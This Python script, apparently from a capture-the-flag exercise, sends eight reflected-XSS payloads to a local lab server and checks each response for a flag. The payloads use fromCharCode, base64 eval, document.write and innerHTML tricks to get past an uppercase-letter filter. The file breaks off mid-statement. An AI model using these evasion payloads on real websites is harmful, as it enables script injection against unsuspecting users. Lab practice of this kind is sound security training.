import requests
import urllib.parse
import re

target_url = "http://127.0.0.1:32830/page"

def url_encode(s):
    return urllib.parse.quote(s, safe='')

def test_final_payloads():
    """Test final payload variations that should bypass uppercase S filter"""
    
    print("="*80)
    print("FINAL XSS BYPASS ATTEMPTS")
    print("="*80)
    print("Strategy: Use document.write to inject HTML that executes XSS")
    print("The HTML will contain uppercase 'XSS' constructed at runtime")
    print()
    
    # Best candidates based on longer response patterns
    final_tests = []
    
    # Payload 1: document.write with fromCharCode (no uppercase in transmission)
    # This writes: <img src=x onerror="alert('XSS')">
    # But constructs 'XSS' using fromCharCode
    payload1 = '";document.write("<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">");//'
    final_tests.append(("document.write + fromCharCode", payload1))
    
    # Payload 2: Same but using eval to avoid filter detection
    payload2 = '";eval("document.write(\"<img src=x onerror=\\\"alert(String.fromCharCode(88,83,83))\\\">\")");//'
    final_tests.append(("eval + document.write", payload2))
    
    # Payload 3: Using innerHTML instead of document.write
    payload3 = '";document.body.innerHTML="<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">";//'
    final_tests.append(("innerHTML injection", payload3))
    
    # Payload 4: Multiple stage - write script tag that writes XSS
    payload4 = '";document.write("<script>alert(String.fromCharCode(88,83,83))<\/script>");//'
    final_tests.append(("script tag injection", payload4))
    
    # Payload 5: Using template literal to avoid quote escaping
    payload5 = '";document.write(`<img src=x onerror="alert(String.fromCharCode(88,83,83))">`);//'
    final_tests.append(("template literal", payload5))
    
    # Payload 6: Unicode escapes that evaluate to HTML
    payload6 = '";eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,34,60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,92,34,97,108,101,114,116,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,56,56,44,56,51,44,56,51,41,41,92,34,62,34,41));//'
    final_tests.append(("Fully encoded document.write", payload6))
    
    # Payload 7: Location-based redirect to data URI
    payload7 = '";location="data:text/html,<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">";'
    final_tests.append(("location redirect", payload7))
    
    # Payload 8: Using eval on decoded string
    payload8 = '";eval(atob("ZG9jdW1lbnQud3JpdGUoJzxpbWcgc3JjPXggb25lcnJvcj0iYWxlcnQoU3RyaW5nLmZyb21DaGFyQ29kZSg4OCw4Myw4MykpIj4nKQ=="));//'
    final_tests.append(("eval of base64", payload8))
    
    success_results = []
    
    for i, (desc, payload) in enumerate(final_tests, 1):
        print(f"\n[FINAL {i:02d}] {desc}")
        print(f"Raw: {payload}")
        
        enc = url_encode(payload)
        print(f"URL: {target_url}?name={enc}")
        
        try:
            url = f"{target_url}?name={enc}"
            r = requests.get(url, timeout=10)
            text = r.text
            length = len(text)
            
            print(f"Length: {length}")
            
            # Check for XSS in response
            if "XSS" in text:
                print(f"[!] SUCCESS! XSS appears in response!")
                
                # Find context
                indices = [m.start() for m in re.finditer('XSS', text)]
                print(f"Found {len(indices)} occurrence(s)")
                
                for idx in indices:
                    snippet = text[max(0, idx-100):idx+50]
                    print(f"Context: ...{snippet}...")
                
                # Check for flag
                if "FLAG{" in text:
                    flag_match = re.search(r'FLAG\{[^}]+\}', text)
                    if flag_match:
                        flag = flag_match.group(0)
                        print(f"[🏴‍☠️] FLAG FOUND: {flag}")
                        success_results.append((desc, payload, enc, flag))
                else:
                    success_results.append((desc, payload, enc, "XSS executed (no flag)"))
            
            # Check for partial success (longer response)
            elif length > 1040:
                print(f"[+] Long response - partial bypass")
                
                # Show reflection
                match = re.search(r'var name = "([^"]*)"', text)
                if match:
                    reflected = match.group(1)
                    print(f"Reflected: {reflected[:100]}...")
            
            else:
                print(f"[-] No XSS, normal response")
                
                # Check for filter message
                if "Sorry you can't use" in text:
